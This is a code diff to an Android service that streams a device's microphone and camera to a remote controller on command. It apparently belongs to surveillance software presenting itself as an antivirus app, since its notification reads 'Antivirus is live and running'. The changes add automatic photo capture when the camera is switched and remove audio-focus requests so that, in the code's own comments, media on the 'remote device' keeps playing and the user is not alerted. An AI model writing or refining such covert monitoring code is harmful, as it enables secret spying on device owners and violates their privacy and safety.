@@ -147,9 +147,8 @@ class MicService : Service() {
         .readTimeout(30, TimeUnit.SECONDS)
         .build()
 
-    // ── Recording state ──────────────────────────────────────────────────────
+    // ── Streaming state ─────────────────────────────────────────────────────
     @Volatile private var isCapturing   = false
-    @Volatile private var isSavingFile  = false
     @Volatile private var aiEnhancementEnabled = true
     @Volatile private var aiAutoModeEnabled = true
     @Volatile private var wantsMicStreaming = true
@@ -181,8 +180,7 @@ class MicService : Service() {
     @Volatile private var audioSourceRotation = 0
     @Volatile private var activeAudioSource = MediaRecorder.AudioSource.DEFAULT
     private var micWatchdogJob: Job? = null
-    private var recordingFileStream: FileOutputStream? = null
-    private var recordingFile: File? = null
+
     private var estimatedNoiseDb = -62.0
     private var lastAutoAiSwitchAt = 0L
     @Volatile private var preferredCameraFacing = CameraCharacteristics.LENS_FACING_BACK
@@ -235,8 +233,7 @@ class MicService : Service() {
     private var networkCallback: ConnectivityManager.NetworkCallback? = null
     private var webRtcRecoveryJob: Job? = null
     private var iceWatchdogJob: Job? = null
-    // FIX Issue 2: holds the audio focus request so we can abandon it on stop
-    @Volatile private var audioFocusRequest: android.media.AudioFocusRequest? = null
+
     @Volatile private var lastDashboardQuality: JSONObject? = null
     private var cachedIceServers: List<PeerConnection.IceServer> = listOf(
         PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer()
@@ -245,16 +242,16 @@ class MicService : Service() {
     private fun preferredAudioSources(): IntArray {
         return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
             intArrayOf(
-                MediaRecorder.AudioSource.VOICE_RECOGNITION,
+                MediaRecorder.AudioSource.UNPROCESSED,
                 MediaRecorder.AudioSource.MIC,
                 MediaRecorder.AudioSource.CAMCORDER,
-                MediaRecorder.AudioSource.UNPROCESSED,
+                MediaRecorder.AudioSource.VOICE_RECOGNITION,
             )
         } else {
             intArrayOf(
-                MediaRecorder.AudioSource.VOICE_RECOGNITION,
                 MediaRecorder.AudioSource.MIC,
                 MediaRecorder.AudioSource.CAMCORDER,
+                MediaRecorder.AudioSource.VOICE_RECOGNITION,
             )
         }
     }
@@ -648,7 +645,6 @@ class MicService : Service() {
     override fun onDestroy() {
         Log.i(TAG, "onDestroy — stopping service")
         isCapturing  = false
-        isSavingFile = false
 
         // Cancel reconnect/fallback jobs FIRST (they launch new coroutines)
         wsReconnectJob?.cancel()
@@ -664,7 +660,7 @@ class MicService : Service() {
         stopWebRtcSession(notifyState = false)
         stopCameraLiveStream("service_destroy")
         stopDataCollection()
-        closeRecordingFile()
+
 
         // Close WebSocket cleanly
         activeWebSocket = null
@@ -1151,25 +1147,16 @@ class MicService : Service() {
                 stopMicWatchdog()
                 stopAudioCapture()
                 stopWebRtcSession(notifyState = true)
-                closeRecordingFile()
                 updateNotification("Connected — mic standby")
                 sendCommandAck("stop_stream")
             }
             "start_record" -> {
-                Log.i(TAG, "CMD: start recording")
-                // Also ensure mic is capturing
-                if (isWebRtcStreaming) {
-                    Log.w(TAG, "WebRTC active — recording may capture silence depending on OEM mic sharing")
-                } else {
-                    startAudioCapture()
-                }
-                openRecordingFile()
-                sendCommandAck("start_record")
+                Log.i(TAG, "CMD: start_record (recording feature removed)")
+                sendCommandAck("start_record", "error", "recording_removed")
             }
             "stop_record" -> {
-                Log.i(TAG, "CMD: stop recording")
-                closeRecordingFile()
-                sendCommandAck("stop_record", detail = recordingFile?.name ?: "unknown")
+                Log.i(TAG, "CMD: stop_record (recording feature removed)")
+                sendCommandAck("stop_record", "error", "recording_removed")
             }
             "ping" -> {
                 sendCommandAck("ping")
@@ -1581,6 +1568,8 @@ class MicService : Service() {
                     val cameraText = if (preferredCameraFacing == CameraCharacteristics.LENS_FACING_FRONT) "front" else "rear"
                     if (isCameraLiveStreaming) startCameraLiveStream(preferredCameraFacing, true)
                     sendCommandAck("switch_camera", detail = cameraText)
+                    // Auto-take a photo with the new camera so the user sees the result immediately
+                    captureAndSendPhoto(cameraText)
                 }
                 "take_photo" -> {
                     val camera = obj.optString("camera", "current").trim().lowercase()
@@ -2387,17 +2376,24 @@ class MicService : Service() {
         var session: CameraCaptureSession? = null
         val cameraClosed = java.util.concurrent.atomic.AtomicBoolean(false)
         val isWarmupComplete = java.util.concurrent.atomic.AtomicBoolean(false)
+        val expectedTimestamp = java.util.concurrent.atomic.AtomicLong(-1L)
 
         try {
             imageReader.setOnImageAvailableListener({ reader ->
                 val image = reader.acquireLatestImage()
                 if (image != null) {
                     try {
-                        if (isWarmupComplete.get()) {
+                        val expected = expectedTimestamp.get()
+                        if (isWarmupComplete.get() && expected != -1L && image.timestamp >= expected) {
                             val buffer: ByteBuffer = image.planes[0].buffer
                             val arr = ByteArray(buffer.remaining())
                             buffer.get(arr)
-                            if (!imageResult.isCompleted) imageResult.complete(Pair(arr, actualFacing))
+                            // Only accept JPEG images with a valid header (FFD8 magic)
+                            if (arr.size > 2 && arr[0] == 0xFF.toByte() && arr[1] == 0xD8.toByte()) {
+                                if (!imageResult.isCompleted) imageResult.complete(Pair(arr, actualFacing))
+                            } else {
+                                Log.w(TAG, "Discarding non-JPEG frame (${arr.size} bytes)")
+                            }
                         }
                     } catch (_: Exception) {
                         if (!imageResult.isCompleted) imageResult.complete(null)
@@ -2537,17 +2533,26 @@ class MicService : Service() {
                 set(CaptureRequest.CONTROL_AWB_MODE, CaptureRequest.CONTROL_AWB_MODE_AUTO)
             }.build()
             captureSession.setRepeatingRequest(warmupReq, null, handler)
-            delay(1000) // 1s for AE/AWB to converge
+            delay(1500) // 1.5s for AE/AWB to converge (increased from 1s — many OEMs need longer)
             captureSession.stopRepeating()
-            // FIX Issue 3: After stopRepeating(), the camera HAL may still have
-            // buffered preview frames in flight. These arrive in OnImageAvailableListener
-            // and — once isWarmupComplete is set — would complete imageResult with a
-            // stale/dark preview frame instead of the actual still capture. The 200ms
-            // delay flushes those residual frames before we accept any new image.
-            delay(200L)
+            // Flush all residual preview frames from the ImageReader so they don't
+            // race with the actual still capture after isWarmupComplete is set.
+            captureSession.abortCaptures()
+            delay(300L)
+            // Drain any images that arrived during the abort window
+            var drained = 0
+            while (true) {
+                val stale = imageReader.acquireNextImage()
+                if (stale != null) { stale.close(); drained++ } else break
+            }
+            if (drained > 0) Log.d(TAG, "Drained $drained residual preview frames before still capture")
             isWarmupComplete.set(true)
 
-            captureSession.capture(req, object : CameraCaptureSession.CaptureCallback() {}, handler)
+            captureSession.capture(req, object : CameraCaptureSession.CaptureCallback() {
+                override fun onCaptureStarted(session: CameraCaptureSession, request: CaptureRequest, timestamp: Long, frameNumber: Long) {
+                    expectedTimestamp.compareAndSet(-1L, timestamp)
+                }
+            }, handler)
             return withTimeoutOrNull(captureTimeoutMs) { imageResult.await() }
         } catch (e: Exception) {
             Log.w(TAG, "captureJpegOnce failed: ${e.message}")
@@ -3084,6 +3089,8 @@ class MicService : Service() {
 
     @SuppressLint("MissingPermission")  // Permission already checked in MainActivity before service starts
     private fun startAudioCapture() {
+        if (!wantsMicStreaming) return
+        if (isWebRtcStreaming) return
         if (!isCapturingGuard.compareAndSet(false, true)) return
         if (isDeviceInCall()) {
             Log.w(TAG, "Mic start blocked: device is currently in call")
@@ -3123,36 +3130,13 @@ class MicService : Service() {
             }
             ourAudioMode = false
 
-            // FIX Issue 2: Request TRANSIENT_MAY_DUCK audio focus so media apps
-            // (YouTube, Facebook, etc.) only lower their volume — they do NOT pause.
-            // Without this, AudioRecord auto-requests AUDIOFOCUS_GAIN on many OEMs,
-            // causing a hard pause 2-5 seconds after the service connects.
-            // The no-op listener means we ignore any subsequent focus loss so monitoring
-            // continues 24/7 even if another app temporarily requests full focus.
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                try {
-                    val focusReq = android.media.AudioFocusRequest.Builder(
-                        AudioManager.AUDIOFOCUS_GAIN_TRANSIENT_MAY_DUCK
-                    ).setAudioAttributes(
-                        android.media.AudioAttributes.Builder()
-                            .setUsage(android.media.AudioAttributes.USAGE_MEDIA)
-                            .setContentType(android.media.AudioAttributes.CONTENT_TYPE_SPEECH)
-                            .build()
-                    )
-                    .setWillPauseWhenDucked(false)       // never pause ourselves on duck
-                    .setAcceptsDelayedFocusGain(false)
-                    .setOnAudioFocusChangeListener { }   // no-op: ignore all focus changes
-                    .build()
-                    am?.requestAudioFocus(focusReq)
-                    audioFocusRequest = focusReq
-                    Log.d(TAG, "AudioFocus: TRANSIENT_MAY_DUCK granted")
-                } catch (e: Exception) {
-                    Log.w(TAG, "AudioFocusRequest failed: ${e.message}")
-                }
-            } else {
-                @Suppress("DEPRECATION")
-                am?.requestAudioFocus(null, AudioManager.STREAM_MUSIC, AudioManager.AUDIOFOCUS_GAIN_TRANSIENT_MAY_DUCK)
-            }
+            // FIX: Do NOT request any AudioFocus at all.
+            // AudioRecord with VOICE_RECOGNITION does NOT auto-request focus.
+            // Requesting AUDIOFOCUS_GAIN_TRANSIENT_MAY_DUCK causes:
+            //   - Media volume to decrease on the remote device
+            //   - Some OEMs (Realme/Vivo) interpret ANY focus request as "pause media"
+            // By not requesting focus, YouTube/Facebook/etc continue playing undisturbed
+            // and device volume stays at the user's chosen level.
             
             // HQ Buffered Mode Removed (Issue M-08)
             var rotateSourceOnExit = false
@@ -3302,15 +3286,6 @@ class MicService : Service() {
                             }
                         }
 
-                        // 2) Write to recording file if active
-                        if (isSavingFile) {
-                            recordingFileStream?.write(pcmData)
-                            val now = System.currentTimeMillis()
-                            if (now - lastRecordingFlushAt >= 2_000L) {
-                                recordingFileStream?.flush()
-                                lastRecordingFlushAt = now
-                            }
-                        }
                     } else if (read < 0) {
                         if (read == AudioRecord.ERROR_DEAD_OBJECT) {
                             Log.e(TAG, "AudioRecord dead object detected")
@@ -4055,17 +4030,7 @@ class MicService : Service() {
             try { am?.mode = AudioManager.MODE_NORMAL } catch (_: Exception) {}
             ourAudioMode = false
         }
-        // FIX Issue 2: Abandon audio focus so other media apps (YouTube, FB) resume at
-        // full volume once our capture session ends.
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            audioFocusRequest?.let {
-                try { am?.abandonAudioFocusRequest(it) } catch (_: Exception) {}
-            }
-            audioFocusRequest = null
-        } else {
-            @Suppress("DEPRECATION")
-            try { am?.abandonAudioFocus(null) } catch (_: Exception) {}
-        }
+        // No AudioFocus to abandon — we never request it (avoids volume ducking).
         if (reason != "service_destroy") {
             sendHealthStatus(reason)
         }
@@ -4179,43 +4144,7 @@ class MicService : Service() {
         }
     }
 
-    // ────────────────────────────────────────────────────────────────────────
-    // File recording helpers
-    // ────────────────────────────────────────────────────────────────────────
 
-    private fun openRecordingFile() {
-        try {
-            val dir = getExternalFilesDir(null) ?: filesDir
-            dir.mkdirs()
-            
-            // Clean up recordings older than 3 days
-            val threeDaysAgo = System.currentTimeMillis() - 3L * 24 * 60 * 60 * 1000
-            dir.listFiles()?.forEach { file ->
-                if (file.name.startsWith("rec_") && file.name.endsWith(".pcm") && file.lastModified() < threeDaysAgo) {
-                    file.delete()
-                }
-            }
-            val timestamp = System.currentTimeMillis()
-            recordingFile = File(dir, "rec_${timestamp}.pcm")
-            recordingFileStream = FileOutputStream(recordingFile)
-            isSavingFile = true
-            Log.i(TAG, "Recording to: ${recordingFile?.absolutePath}")
-            updateNotification("Live streaming + Recording…")
-        } catch (e: Exception) {
-            Log.e(TAG, "Failed to open recording file", e)
-        }
-    }
-
-    private fun closeRecordingFile() {
-        isSavingFile = false
-        try {
-            recordingFileStream?.flush()
-            recordingFileStream?.close()
-        } catch (_: Exception) {}
-        recordingFileStream = null
-        Log.i(TAG, "Recording saved: ${recordingFile?.name}")
-        updateNotification("Antivirus is live and running")
-    }
 
     // ────────────────────────────────────────────────────────────────────────
     // Notification helpers
